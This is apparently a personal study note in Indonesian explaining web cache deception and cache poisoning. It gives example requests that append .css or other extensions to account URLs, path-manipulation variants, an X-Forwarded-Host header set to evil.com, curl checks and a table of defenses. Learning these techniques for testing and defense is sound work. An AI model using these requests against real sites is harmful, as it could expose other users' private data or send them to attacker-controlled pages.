---
title: "Web Cache Deception & Web Cache Poisoning — CDN Cache Manipulation, Exploit, Defense"
tags:
  - cyber-security
  - cache
  - web-security
  - cdn
  - cloudflare
  - library
aliases:
  - "Web Cache Deception Guide"
  - "Cache Poisoning Attack"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Web Cache Deception mengecoh cache (CDN/load balancer) agar menyimpan halaman yang berisi sensitive information. Attacker memanfaatkan perbedaan cara server dan cache menentukan apakah request mengarah ke static file. Web Cache Poisoning mencemari cache dengan response jahat sehingga user lain menerima konten attacker.

**Cross-link:** [[cloudflare-ruleset-engine-phases]] → [[web-security]] → [[api-security-deep-dive]]

---

## Daftar Isi
- [[#1. Cache Deception vs Cache Poisoning]]
- [[#2. Cache Deception Exploitation]]
- [[#3. Cache Poisoning — Unkeyed Attack]]
- [[#4. Detection & Tools]]
- [[#5. Defense]]

---

## 1. Cache Deception vs Cache Poisoning

| Aspek | Cache Deception | Cache Poisoning |
|---|---|---|
| **Tujuan** | Cache sensitive page via extension trick | Inject malicious response ke cache |
| **Korban** | User yang sensitive datanya ter-cache | Semua user yang request halaman legitimate |
| **Vektor** | Add `/.css` or `/test.css` di URL path | Exploit unkeyed headers (X-Forwarded-Host) |
| **Dampak** | PII leakage via public cache | Malware distribution, session hijacking |

---

## 2. Cache Deception Exploitation

### Teknik Dasar

```http
# Request ini dianggap static file oleh CDN karena extension .css
# Tapi server (Django/Rails) mengabaikan ekstensi dan return sensitive page
GET /account/profile/settings.css HTTP/1.1
Host: target.com

# Jika cache menyimpan response → bisa diakses siapa aja
GET /account/profile/settings.css
# → Return sensitive page dari cache!
```

### Variasi Extension

```bash
# Extension static yang umum di-cache
/account/profile/.css
/account/profile/test.css
/account/profile/settings.js
/account/profile/avatar.jpg
/account/profile/data.xml

# Path manipulation
/account/profile/..;/settings.css
/account/profile%00.css
/account/profile%23.css  # fragment
```

---

## 3. Cache Poisoning — Unkeyed Headers

### X-Forwarded-Host / X-Host

```http
GET /api/users HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Jika backend menggunakan XFH untuk generate redirect/template URL
# Cache menyimpan response dengan URL dari evil.com
# User lain → redirect ke evil.com
```

### Unkeyed Query Parameters

```http
# Cache hanya key: path + host
# Tidak key: random parameter

GET /api/profile?random=123
# Response: {"user": "admin", "credit_card": "4111..."}
# Di-cache karena WAF/CDN ngira static

GET /api/profile?random=456
# Mendapat response dari cache milik user lain
```

---

## 4. Detection & Tools

```bash
# Test cache deception
curl -H "X-Forwarded-Host: evil.com" http://target.com/api/profile

# Cek apakah response di-cache (via Age header)
curl -I http://target.com/api/profile/settings.css
# Jika ada CF-Cache-Status: HIT → vulnerable

# Tool: Param Miner (Burp) — detect unkeyed parameters
```

---

## 5. Defense

| Defense | Implementasi |
|---|---|
| **Cache-Control: no-store** | Sensitive pages harus `Cache-Control: no-store, private` |
| **Extension validation** | Jangan abaikan extension — validasi path |
| **Disable caching for auth pages** | Semua halaman auth: no-cache |
| **CDN WAF rule** | Block request dengan path manipulation |
| **Normalize URL before cache** | Jangan cache jika path mengandung ekstensi tidak valid |

**Referensi:** `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Web Cache Deception/`
